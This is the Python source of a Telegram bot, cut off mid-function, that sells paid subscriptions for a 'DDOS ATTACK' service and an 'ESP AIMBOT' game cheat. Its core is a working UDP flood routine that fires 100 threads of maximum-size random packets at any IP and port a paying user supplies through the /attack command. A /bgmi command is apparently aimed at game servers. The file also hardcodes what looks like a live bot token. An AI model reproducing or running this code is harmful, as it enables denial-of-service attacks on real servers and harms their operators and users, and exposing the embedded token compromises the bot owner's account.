#!/usr/bin/python3

import telebot
import datetime
import os
import time
import random
import string
import json
import threading
import socket
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================ BOT TOKEN ================
BOT_TOKEN = '8714634973:AAE9yxOf7moILFMYVlCe0IYMJI1xW5BLIPw'
bot = telebot.TeleBot(BOT_TOKEN)

# ================ ADMIN IDs ================
admin_id = {"7201893742"}
YOUR_USER_ID = "7201893742"

# ================ FILES ================
USER_FILE = "users.txt"
KEYS_FILE = "license_keys.json"
SUBSCRIPTIONS_FILE = "subscriptions.json"
LOG_FILE = "log.txt"

# ================ QR CODES ================
QR_MAIN = "https://files.catbox.moe/8uxobs.jpg"
QR_ALTERNATIVE = "https://files.catbox.moe/p6teay.jpg"

# ================ SETUP LINKS ================
ANDROID_SETUP_LINK = "https://t.me/antinasetup/3link"
IOS_SETUP_LINK = "https://t.me/antinasetup/8"

# ================ AI DISABLED (Fix for termux) ================
AI_AVAILABLE = False

# ================ USER CONVERSATIONS ================
user_conversations = {}

# ================ FILE FUNCTIONS ================

def load_keys():
    try:
        with open(KEYS_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, "w") as f:
        json.dump(keys, f, indent=4)

def load_subscriptions():
    try:
        with open(SUBSCRIPTIONS_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

def save_subscriptions(subs):
    with open(SUBSCRIPTIONS_FILE, "w") as f:
        json.dump(subs, f, indent=4)

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def has_active_subscription(user_id):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    
    if user_id_str in admin_id or user_id_str == YOUR_USER_ID:
        return True
    
    if user_id_str in subs:
        try:
            expiry_date = datetime.datetime.fromisoformat(subs[user_id_str])
            if expiry_date > datetime.datetime.now():
                return True
            else:
                del subs[user_id_str]
                save_subscriptions(subs)
        except:
            return False
    return False

def get_subscription_expiry(user_id):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    
    if user_id_str in admin_id or user_id_str == YOUR_USER_ID:
        return "Owner (Lifetime)"
    
    if user_id_str in subs:
        try:
            return datetime.datetime.fromisoformat(subs[user_id_str])
        except:
            return None
    return None

def add_subscription(user_id, days):
    subs = load_subscriptions()
    user_id_str = str(user_id)
    
    current_expiry = get_subscription_expiry(user_id)
    if current_expiry and current_expiry > datetime.datetime.now():
        new_expiry = current_expiry + datetime.timedelta(days=days)
    else:
        new_expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    
    subs[user_id_str] = new_expiry.isoformat()
    save_subscriptions(subs)
    return new_expiry

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()
bgmi_cooldown = {}
COOLDOWN_TIME = 300

# ==================== UDP FLOOD ATTACK ====================

def udp_flood(target_ip, target_port, duration):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = random._urandom(65507)
        end_time = time.time() + duration
        count = 0
        while time.time() < end_time:
            sock.sendto(packet, (target_ip, int(target_port)))
            count += 1
        sock.close()
        return count
    except:
        return 0

def start_attack(target_ip, target_port, duration):
    threads = []
    results = []
    
    def worker():
        r = udp_flood(target_ip, target_port, duration)
        results.append(r)
    
    for i in range(100):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    return sum(results)

# ================ SETUP GUIDE ================

@bot.message_handler(func=lambda message: message.text and any(
    keyword in message.text.lower() for keyword in 
    ['kaise lagaye', 'setup kaise kare', 'how to setup', 'setup', 'lagana hai', 'installation']
))
def setup_guide(message):
    user_name = message.from_user.first_name
    
    markup = InlineKeyboardMarkup(row_width=2)
    btn_android = InlineKeyboardButton("ANDROID", callback_data="setup_android")
    btn_ios = InlineKeyboardButton("IPHONE", callback_data="setup_ios")
    markup.add(btn_android, btn_ios)
    
    bot.reply_to(message, f"📥 {user_name}, kaunsa device hai? Select karo:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "setup_android")
def setup_android(call):
    markup = InlineKeyboardMarkup()
    btn_link = InlineKeyboardButton("ANDROID SETUP", url=ANDROID_SETUP_LINK)
    btn_back = InlineKeyboardButton("BACK", callback_data="setup_back")
    markup.add(btn_link, btn_back)
    
    bot.edit_message_text("📱 Ye le Android setup link:", call.message.chat.id, 
                         call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "setup_ios")
def setup_ios(call):
    markup = InlineKeyboardMarkup()
    btn_link = InlineKeyboardButton("IOS SETUP", url=IOS_SETUP_LINK)
    btn_back = InlineKeyboardButton("BACK", callback_data="setup_back")
    markup.add(btn_link, btn_back)
    
    bot.edit_message_text("🍎 Ye le iPhone setup link:", call.message.chat.id, 
                         call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "setup_back")
def setup_back(call):
    user_name = call.from_user.first_name
    markup = InlineKeyboardMarkup(row_width=2)
    btn_android = InlineKeyboardButton("ANDROID", callback_data="setup_android")
    btn_ios = InlineKeyboardButton("IPHONE", callback_data="setup_ios")
    markup.add(btn_android, btn_ios)
    
    bot.edit_message_text(f"📥 {user_name}, kaunsa device hai?", 
                         call.message.chat.id, call.message.message_id, reply_markup=markup)

# ================ MAIN MENU (/start) ================

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = str(message.chat.id)
    
    markup = InlineKeyboardMarkup(row_width=2)
    btn_ddos = InlineKeyboardButton("DDOS ATTACK", callback_data="ddos_menu")
    btn_esp = InlineKeyboardButton("ESP AIMBOT", callback_data="esp_menu")
    btn_setup = InlineKeyboardButton("SETUP GUIDE", callback_data="setup_menu")
    markup.add(btn_ddos, btn_esp)
    markup.add(btn_setup)
    
    if has_active_subscription(user_id):
        expiry = get_subscription_expiry(user_id)
        if expiry and expiry != "Owner (Lifetime)":
            days_left = (expiry - datetime.datetime.now()).days
            status = f"Active ({days_left} din bache)"
        else:
            status = "Active"
    else:
        status = "No subscription"
    
    welcome_text = f"""HI - {user_name}

Bot by @M_JITENDRA

Status: {status}

Select Option:"""
    
    bot.reply_to(message, welcome_text, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "setup_menu")
def setup_menu(call):
    user_name = call.from_user.first_name
    markup = InlineKeyboardMarkup(row_width=2)
    btn_android = InlineKeyboardButton("ANDROID", callback_data="setup_android")
    btn_ios = InlineKeyboardButton("IPHONE", callback_data="setup_ios")
    btn_back = InlineKeyboardButton("MAIN MENU", callback_data="main_menu")
    markup.add(btn_android, btn_ios)
    markup.add(btn_back)
    
    bot.edit_message_text(f"🔧 {user_name}, apna device select karo:", 
                         call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "ddos_menu")
def ddos_menu(call):
    markup = InlineKeyboardMarkup(row_width=1)
    btn_7day = InlineKeyboardButton("7 DAYS - Rs 160", callback_data="buy_ddos_7")
    btn_month = InlineKeyboardButton("MONTH - Rs 199", callback_data="buy_ddos_30")
    btn_season = InlineKeyboardButton("SEASON - Rs 250", callback_data="buy_ddos_90")
    btn_permanent = InlineKeyboardButton("PERMANENT - Rs 299", callback_data="buy_ddos_permanent")
    btn_back = InlineKeyboardButton("MAIN MENU", callback_data="main_menu")
    markup.add(btn_7day, btn_month, btn_season, btn_permanent, btn_back)
    
    price_text = """DDOS ATTACK PRICES

7 DAYS - Rs 160
MONTH - Rs 199
SEASON - Rs 250
PERMANENT - Rs 299

Features: Unlimited attacks, 180 sec, 5 min cooldown"""
    
    bot.edit_message_text(price_text, call.message.chat.id, call.message.message_id, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "esp_menu")
def esp_menu(call):
    markup = InlineKeyboardMarkup(row_width=1)
    btn_7day = InlineKeyboardButton("7 DAYS - Rs 199", callback_data="buy_esp_7")
    btn_month = InlineKeyboardButton("MONTH - Rs 250", callback_data="buy_esp_30")
    btn_season = InlineKeyboardButton("SEASON - Rs 350 (DDOS FREE)", callback_data="buy_esp_90")
    btn_back = InlineKeyboardButton("MAIN MENU", callback_data="main_menu")
    markup.add(btn_7day, btn_month, btn_season, btn_back)
    
    price_text = """ESP AIMBOT PRICES

7 DAYS - Rs 199
MONTH - Rs 250
SEASON - Rs 350 (DDOS FREE INCLUDED)

Season plan mein DDOS free!"""
    
    bot.edit_message_text(price_text, call.message.chat.id, call.message.message_id, reply_markup=markup)

# ================ BUY HANDLERS ================

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_ddos_"))
def buy_ddos(call):
    plan = call.data.replace("buy_ddos_", "")
    
    if plan == "7":
        price = "Rs 160"
        plan_name = "7 Days DDOS"
    elif plan == "30":
        price = "Rs 199"
        plan_name = "Month DDOS"
    elif plan == "90":
        price = "Rs 250"
        plan_name = "Season DDOS"
    elif plan == "permanent":
        price = "Rs 299"
        plan_name = "Permanent DDOS"
    else:
        return
    
    markup = InlineKeyboardMarkup()
    btn_contact = InlineKeyboardButton("CONTACT OWNER", url="https://t.me/M_JITENDRA")
    btn_back = InlineKeyboardButton("BACK", callback_data="ddos_menu")
    markup.add(btn_contact, btn_back)
    
    bot.send_message(call.message.chat.id, 
                     f"TO PURCHASE {plan_name}\n\nPrice: {price}\n\nContact @M_JITENDRA to complete payment.",
                     reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("buy_esp_"))
def buy_esp(call):
    plan = call.data.replace("buy_esp_", "")
    
    if plan == "7":
        price = "Rs 199"
        plan_name = "7 Days ESP"
    elif plan == "30":
        price = "Rs 250"
        plan_name = "Month ESP"
    elif plan == "90":
        price = "Rs 350"
        plan_name = "Season ESP + DDOS Free"
    else:
        return
    
    markup = InlineKeyboardMarkup()
    btn_contact = InlineKeyboardButton("CONTACT OWNER", url="https://t.me/M_JITENDRA")
    btn_back = InlineKeyboardButton("BACK", callback_data="esp_menu")
    markup.add(btn_contact, btn_back)
    
    bot.send_message(call.message.chat.id, 
                     f"TO PURCHASE {plan_name}\n\nPrice: {price}\n\nContact @M_JITENDRA to complete payment.",
                     reply_markup=markup)

# ================ BACK TO MAIN MENU ================

@bot.callback_query_handler(func=lambda call: call.data == "main_menu")
def back_to_main(call):
    user_name = call.from_user.first_name
    user_id = str(call.from_user.id)
    
    markup = InlineKeyboardMarkup(row_width=2)
    btn_ddos = InlineKeyboardButton("DDOS ATTACK", callback_data="ddos_menu")
    btn_esp = InlineKeyboardButton("ESP AIMBOT", callback_data="esp_menu")
    btn_setup = InlineKeyboardButton("SETUP GUIDE", callback_data="setup_menu")
    markup.add(btn_ddos, btn_esp)
    markup.add(btn_setup)
    
    if has_active_subscription(user_id):
        expiry = get_subscription_expiry(user_id)
        if expiry and expiry != "Owner (Lifetime)":
            days_left = (expiry - datetime.datetime.now()).days
            status = f"Active ({days_left} din bache)"
        else:
            status = "Active"
    else:
        status = "No subscription"
    
    welcome_text = f"HI - {user_name}\n\nBot by @M_JITENDRA\n\nStatus: {status}\n\nSelect Option:"
    
    bot.edit_message_text(welcome_text, call.message.chat.id, call.message.message_id, reply_markup=markup)

# ================ COMMANDS ================

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    
    if not has_active_subscription(user_id):
        bot.reply_to(message, "No subscription! Buy from @M_JITENDRA or use /redeem <key>")
        return
    
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>\nExample: /attack 13.126.255.102 14001 60")
        return
    
    target = command[1]
    port = command[2]
    time_duration = int(command[3])
    
    if time_duration > 120:
        time_duration = 120
    
    bot.reply_to(message, f"ATTACK STARTED!\nTarget: {target}:{port}\nTime: {time_duration}s\n\nSending packets...")
    
    def run():
        total = start_attack(target, port, time_duration)
        bot.reply_to(message, f"ATTACK COMPLETE!\nPackets Sent: {total:,}\nTarget: {target}:{port}\n\n@M_JITENDRA")
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if not has_active_subscription(user_id) and user_id not in admin_id:
        bot.reply_to(message, "No subscription! Buy from @M_JITENDRA")
        return
    
    if user_id not in allowed_user_ids and user_id not in admin_id:
        bot.reply_to(message, "Not authorized!")
        return
    
    if user_id not in admin_id:
        if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
            remaining = COOLDOWN_TIME - (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
            bot.reply_to(message, f"Cooldown! Wait {remaining} seconds")
            return
        bgmi_cooldown[user_id] = datetime.datetime.now()
    
    command = message.text.split()
    if len(command) == 4:
        target = command[1]
        port = command[2]
        time_duration = command[3]
        bot.reply_to(message, f"Attack started!\nTarget: {target}\nPort: {port}\nTime: {time_duration}s")
    else:
        bot.reply_to(message, "Usage: /bgmi <IP> <PORT> <TIME>")

@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) != 2:
        bot.reply_to(message, "Usage: /redeem <key>")
        return
    
    key = command[1]
    keys = load_keys()
    
    if key in keys:
        key_data = keys.pop(key)
        days = key_data.get('days', 30)
        add_subscription(user_id, days)
        save_keys(keys)
        
        bot.reply_to(message, f"KEY REDEEMED!\nAccess for {days} days added.\nUse /attack command now!")
    else:
        bot.reply_to(message, "INVALID KEY!\nContact @M_JITENDRA")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only owner can generate keys!")
        return
    
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /genkey <days>\nExample: /genkey 30")
        return
    
    days = int(command[1])
    key = generate_key()
    keys = load_keys()
    keys[key] = {"days": days, "created": str(datetime.datetime.now())}
    save_keys(keys)
    
    bot.reply_to(message, f"KEY GENERATED!\n\nKey: {key}\nDays: {days}\n\nSend to user: /redeem {key}")

@bot.message_handler(commands=['test'])
def test_cmd(message):
    bot.reply_to(message, "Bot is working! Owner: @M_JITENDRA")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    help_text = """BOT COMMANDS

/start - Main menu
/attack <IP> <PORT> <TIME> - Start attack
/bgmi <IP> <PORT> <TIME> - BGMI attack
/redeem <key> - Redeem key
/genkey <days> - Generate key (admin)
/test - Test bot
/help - Show help

DDOS PRICES:
7 Days - Rs 160 | Month - Rs 199 | Season - Rs 250 | Permanent - Rs 299

ESP PRICES:
7 Days - Rs 199 | Month - Rs 250 | Season - Rs 350 (DDOS FREE)

Contact: @M_JITENDRA"""
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['rules'])
def rules_cmd(message):
    user_name = message.from_user.first_name
    response = f"""{user_name} Please Follow These Rules:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time
3. Join @M_JITENDRA
4. Follow rules to avoid ban"""
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def plan_cmd(message):
    user_name = message.from_user.first_name
    response = f"""{user_name}, DDOS Plans:

VIP Plan:
Attack Time: 300 seconds
After Attack Limit: 10 sec
Concurrents Attack: 5

Price:
3 day -> free
Week -> free
Month -> free"""
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def admincmd_cmd(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    response = """Admin Commands:

/add <userId> <duration> - Add user
/remove <userid> - Remove user
/allusers - Show all users
/logs - View logs
/broadcast - Broadcast message
/clearlogs - Clear logs
/clearusers - Clear users
/genkey <days> - Generate key"""
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def allusers_cmd(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    try:
        with open(USER_FILE, "r") as f:
            users = f.read().splitlines()
            if users:
                response = "Authorized Users:\n"
                for uid in users:
                    try:
                        user_info = bot.get_chat(int(uid))
                        username = user_info.username
                        response += f"- @{username} (ID: {uid})\n"
                    except:
                        response += f"- User ID: {uid}\n"
            else:
                response = "No users found"
    except:
        response = "No users file found"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def logs_cmd(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    try:
        with open(LOG_FILE, "rb") as f:
            bot.send_document(message.chat.id, f)
    except:
        bot.reply_to(message, "No logs found!")

@bot.message_handler(commands=['clearlogs'])
def clearlogs_cmd(message):
    user_id = str(message.chat.id)
    
    if user_id not in admin_id:
        bot.reply_to(message, "Only admin can use this!")
        return
    
    response = "Logs cleared successfully!"
    try:
        open(LOG_FILE, "w").close()
    except:
        response = "No logs to clear!"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['clearusers'])
def clearusers_cmd(message):
    user_id = str(message.chat.id)
